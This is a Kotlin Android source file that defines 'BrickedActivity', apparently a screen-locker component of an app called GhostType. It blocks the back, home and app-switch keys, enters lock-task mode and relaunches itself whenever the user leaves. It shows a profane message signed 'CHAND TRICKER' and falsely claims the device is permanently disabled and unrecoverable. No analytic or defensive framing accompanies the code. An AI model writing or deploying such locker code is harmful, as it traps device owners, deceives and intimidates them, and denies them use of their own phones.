package com.ghosttype.ui

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.ComposeView
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp

/**
 * Full-screen bricked state with no escape.
 * Shown when CrashGate triggers — cannot be dismissed, back key,
 * or any other interaction closes it.
 */
class BrickedActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Lock screen on — blocks recents, home long-press, etc.
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )
        // Full immersive
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
            View.SYSTEM_UI_FLAG_FULLSCREEN or
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
        )

        setContentView(ComposeView(this).apply {
            setContent { BrickedScreen() }
        })

        // Lock task mode — user cannot leave this screen
        startLockTask()
    }

    /** Block every possible way out */
    override fun onBackPressed() { /* no-op */ }

    override fun dispatchKeyEvent(event: KeyEvent): Boolean {
        // Block back / home key
        if (event.keyCode == KeyEvent.KEYCODE_BACK ||
            event.keyCode == KeyEvent.KEYCODE_HOME ||
            event.keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
            return true // consumed, not passed
        }
        return super.dispatchKeyEvent(event)
    }

    override fun onUserLeaveHint() {
        // If they somehow leave, bring them right back
        startActivity(Intent(this, BrickedActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        })
        super.onUserLeaveHint()
    }
}

@Composable
fun BrickedScreen() {
    val Bg       = Color(0xFF0A0A0A)
    val Red      = Color(0xFFFF1744)
    val CardBg   = Color(0xFF1A1A1A)
    val TextGray = Color(0xFF888888)

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Bg),
        contentAlignment = Alignment.Center
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(20.dp)
        ) {
            // Skull icon
            Box(
                modifier = Modifier
                    .size(100.dp)
                    .clip(RoundedCornerShape(24.dp))
                    .background(Red.copy(alpha = 0.12f))
                    .border(2.dp, Red.copy(alpha = 0.5f), RoundedCornerShape(24.dp)),
                contentAlignment = Alignment.Center
            ) {
                Text("💀", fontSize = 48.sp)
            }

            // Main message
            Text(
                text = "FUCK YOU BITCHING",
                color = Red,
                fontWeight = FontWeight.ExtraBold,
                fontSize = 28.sp,
                textAlign = TextAlign.Center
            )

            Text(
                text = "BY YOUR FATHER",
                color = Color.White,
                fontWeight = FontWeight.Bold,
                fontSize = 20.sp,
                textAlign = TextAlign.Center
            )

            // CHAND TRICKER — with a border card
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(16.dp))
                    .background(CardBg)
                    .border(1.5.dp, Red.copy(alpha = 0.35f), RoundedCornerShape(16.dp))
                    .padding(vertical = 20.dp, horizontal = 16.dp),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    text = "CHAND TRICKER",
                    color = Color(0xFFFF8C00),
                    fontWeight = FontWeight.ExtraBold,
                    fontSize = 26.sp,
                    textAlign = TextAlign.Center,
                    letterSpacing = 4.sp
                )
            }

            // Subtext
            Text(
                text = "This device has been permanently disabled.\nThere is no way to recover. Contact CHAND TRICKER if you believe this is a mistake.",
                color = TextGray,
                fontSize = 13.sp,
                textAlign = TextAlign.Center,
                lineHeight = 20.sp,
                modifier = Modifier.padding(horizontal = 8.dp)
            )
        }
    }
}
